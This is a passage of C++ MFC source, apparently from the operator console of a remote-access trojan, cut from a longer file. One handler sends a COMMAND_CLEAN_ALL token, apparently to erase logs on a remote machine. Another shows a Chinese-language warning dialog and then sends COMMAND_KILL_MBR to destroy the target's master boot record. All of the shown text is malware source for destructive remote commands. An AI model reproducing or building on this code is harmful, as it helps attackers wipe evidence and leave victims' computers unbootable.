	BYTE	bToken = COMMAND_CLEAN_ALL;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnAqglYp()
{
	if (MessageBox("硬盘加锁后将无法格式化，确定吗?", "警告", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_KILL_MBR;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));
}